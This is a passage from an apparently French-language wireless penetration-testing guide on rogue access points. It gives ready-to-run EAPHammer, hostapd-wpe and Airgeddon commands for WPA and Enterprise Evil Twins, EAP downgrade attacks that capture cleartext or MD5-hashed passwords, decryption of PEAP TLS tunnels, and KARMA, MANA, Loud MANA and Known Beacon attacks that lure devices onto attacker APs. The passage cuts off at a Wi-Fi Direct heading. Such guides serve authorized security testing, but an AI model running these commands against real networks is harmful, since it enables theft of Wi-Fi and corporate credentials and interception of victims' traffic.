Veuillez noter qu'en règle générale, si un ESSID dans le PNL est enregistré comme protégé par WPA, l'appareil ne se connectera pas automatiquement à un Evil Twin ouvert. Vous pouvez essayer de DoS le vrai AP et espérer que l'utilisateur se connecte manuellement à votre Evil Twin ouvert, ou vous pourriez DoS le vrai AP et utiliser un WPA Evil Twin pour capturer le handshake (en utilisant cette méthode, vous ne pourrez pas laisser la victime se connecter à vous car vous ne connaissez pas le PSK, mais vous pouvez capturer le handshake et essayer de le cracker).

_Certains systèmes d'exploitation et antivirus avertiront l'utilisateur que se connecter à un réseau ouvert est dangereux..._

### WPA/WPA2 Evil Twin

Vous pouvez créer un **Evil Twin utilisant WPA/2** et si les appareils sont configurés pour se connecter à ce SSID avec WPA/2, ils vont essayer de se connecter. Quoi qu'il en soit, **pour compléter le 4-way-handshake**, vous devez également **connaître** le **mot de passe** que le client va utiliser. Si vous **ne le connaissez pas**, la **connexion ne sera pas complétée**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Pour comprendre ces attaques, je recommande de lire d'abord le bref [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Utilisation de hostapd-wpe**

`hostapd-wpe` nécessite un **fichier de configuration** pour fonctionner. Pour **automatiser** la génération de ces configurations, vous pouvez utiliser [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (téléchargez le fichier python à l'intérieur de _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Dans le fichier de configuration, vous pouvez sélectionner de nombreuses choses différentes comme ssid, canal, fichiers utilisateur, cret/key, paramètres dh, version wpa et auth...

[**Utiliser hostapd-wpe avec EAP-TLS pour permettre à n'importe quel certificat de se connecter.**](evil-twin-eap-tls.md)

**Utiliser EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Par défaut, EAPHammer propose ces méthodes d'authentification (notez GTC comme la première à essayer pour obtenir des mots de passe en clair, puis l'utilisation de méthodes d'authentification plus robustes) :
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
C'est la méthodologie par défaut pour éviter de longs temps de connexion. Cependant, vous pouvez également spécifier aux serveurs les méthodes d'authentification du plus faible au plus fort :
```
--negotiate weakest
```
Ou vous pourriez également utiliser :

- `--negotiate gtc-downgrade` pour utiliser une implémentation de downgrade GTC très efficace (mots de passe en texte clair)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` pour spécifier manuellement les méthodes proposées (offrir les mêmes méthodes d'authentification dans le même ordre que l'organisation rendra l'attaque beaucoup plus difficile à détecter).
- [Trouvez plus d'infos dans le wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Utilisation d'Airgeddon**

`Airgeddon` peut utiliser des certificats précédemment générés pour offrir une authentification EAP aux réseaux WPA/WPA2-Enterprise. Le réseau factice va rétrograder le protocole de connexion à EAP-MD5 afin de pouvoir **capturer l'utilisateur et le MD5 du mot de passe**. Plus tard, l'attaquant peut essayer de cracker le mot de passe.\
`Airgeddon` vous offre la possibilité d'une **attaque Evil Twin continue (bruyante)** ou **de créer uniquement l'attaque Evil jusqu'à ce que quelqu'un se connecte (silencieuse).**

![](<../../images/image (936).png>)

### Débogage des tunnels TLS PEAP et EAP-TTLS dans les attaques Evil Twins

_Cette méthode a été testée dans une connexion PEAP mais comme je déchiffre un tunnel TLS arbitraire, cela devrait également fonctionner avec EAP-TTLS_

Dans la **configuration** de _hostapd-wpe_, **commentez** la ligne contenant _**dh_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` à `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Cela fera que `hostapd-wpe` **échange des clés en utilisant RSA** au lieu de DH, vous permettant ainsi de **décrypter** le trafic plus tard **en connaissant la clé privée du serveur**.

Maintenant, démarrez le **Evil Twin** en utilisant **`hostapd-wpe`** avec cette configuration modifiée comme d'habitude. Démarrez également **`wireshark`** dans l'**interface** qui effectue l'attaque Evil Twin.

Maintenant ou plus tard (lorsque vous avez déjà capturé quelques tentatives d'authentification), vous pouvez ajouter la clé RSA privée à wireshark dans : `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Ajoutez une nouvelle entrée et remplissez le formulaire avec ces valeurs : **Adresse IP = any** -- **Port = 0** -- **Protocole = data** -- **Fichier de clé** (**sélectionnez votre fichier de clé**, pour éviter les problèmes, sélectionnez un fichier de clé **sans protection par mot de passe**).

![](<../../images/image (687).png>)

Et regardez le nouvel **onglet "TLS déchiffré"** :

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA et attaque de balises connues

### ESSID et listes noires/blanches MAC

Différents types de listes de filtres d'accès aux médias (MFACLs) et leurs modes et effets correspondants sur le comportement d'un point d'accès (AP) malveillant :

1. **Liste blanche basée sur MAC** :
- Le point d'accès malveillant ne répondra qu'aux requêtes de sonde des appareils spécifiés dans la liste blanche, restant invisible à tous les autres non listés.
2. **Liste noire basée sur MAC** :
- Le point d'accès malveillant ignorera les requêtes de sonde des appareils sur la liste noire, rendant effectivement le point d'accès malveillant invisible à ces appareils spécifiques.
3. **Liste blanche basée sur SSID** :
- Le point d'accès malveillant répondra aux requêtes de sonde uniquement pour des ESSIDs spécifiques listés, le rendant invisible aux appareils dont les listes de réseaux préférés (PNLs) ne contiennent pas ces ESSIDs.
4. **Liste noire basée sur SSID** :
- Le point d'accès malveillant ne répondra pas aux requêtes de sonde pour les ESSIDs spécifiques sur la liste noire, le rendant invisible aux appareils recherchant ces réseaux particuliers.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Cette méthode permet à un **attaquant de créer un point d'accès malveillant (AP) qui répond à toutes les requêtes de sonde** des appareils cherchant à se connecter à des réseaux. Cette technique **trompe les appareils en les faisant se connecter à l'AP de l'attaquant** en imitant les réseaux que les appareils recherchent. Une fois qu'un appareil envoie une demande de connexion à cet AP malveillant, il complète la connexion, conduisant l'appareil à se connecter par erreur au réseau de l'attaquant.

### MANA

Ensuite, **les appareils ont commencé à ignorer les réponses réseau non sollicitées**, réduisant l'efficacité de l'attaque karma originale. Cependant, une nouvelle méthode, connue sous le nom d'**attaque MANA**, a été introduite par Ian de Villiers et Dominic White. Cette méthode implique que l'AP malveillant **capture les listes de réseaux préférés (PNL) des appareils en répondant à leurs requêtes de sonde diffusées** avec des noms de réseaux (SSID) précédemment sollicités par les appareils. Cette attaque sophistiquée contourne les protections contre l'attaque karma originale en exploitant la façon dont les appareils se souviennent et priorisent les réseaux connus.

L'attaque MANA fonctionne en surveillant à la fois les requêtes de sonde dirigées et diffusées des appareils. Pour les requêtes dirigées, elle enregistre l'adresse MAC de l'appareil et le nom du réseau demandé, ajoutant ces informations à une liste. Lorsqu'une requête diffusée est reçue, l'AP répond avec des informations correspondant à l'un des réseaux de la liste de l'appareil, incitant l'appareil à se connecter à l'AP malveillant.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Une **attaque Loud MANA** est une stratégie avancée pour les cas où les appareils n'utilisent pas de sondage dirigé ou lorsque leurs listes de réseaux préférés (PNL) sont inconnues de l'attaquant. Elle fonctionne sur le principe que **les appareils dans la même zone sont susceptibles de partager certains noms de réseau dans leurs PNL**. Au lieu de répondre de manière sélective, cette attaque diffuse des réponses de sonde pour chaque nom de réseau (ESSID) trouvé dans les PNL combinées de tous les appareils observés. Cette approche large augmente la chance qu'un appareil reconnaisse un réseau familier et tente de se connecter au point d'accès (AP) malveillant.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Lorsque l'**attaque Loud MANA** peut ne pas suffire, l'**attaque Known Beacon** présente une autre approche. Cette méthode **force le processus de connexion en simulant un AP qui répond à n'importe quel nom de réseau, en parcourant une liste d'ESSIDs potentiels** dérivés d'une liste de mots. Cela simule la présence de nombreux réseaux, espérant faire correspondre un ESSID dans la PNL de la victime, incitant à une tentative de connexion à l'AP fabriqué. L'attaque peut être amplifiée en la combinant avec l'option `--loud` pour une tentative plus agressive d'attraper des appareils.

Eaphammer a implémenté cette attaque comme une attaque MANA où tous les ESSIDs d'une liste sont chargés (vous pouvez également combiner cela avec `--loud` pour créer une attaque Loud MANA + Known beacons) :
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Attaque de Beacon Burst connue**

L'**attaque de Beacon Burst connue** implique **la diffusion rapide de trames de beacon pour chaque ESSID répertorié dans un fichier**. Cela crée un environnement dense de réseaux fictifs, augmentant considérablement la probabilité que des appareils se connectent à l'AP malveillant, surtout lorsqu'elle est combinée avec une attaque MANA. Cette technique exploite la vitesse et le volume pour submerger les mécanismes de sélection de réseau des appareils.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** est un protocole permettant aux appareils de se connecter directement entre eux via Wi-Fi sans avoir besoin d'un point d'accès sans fil traditionnel
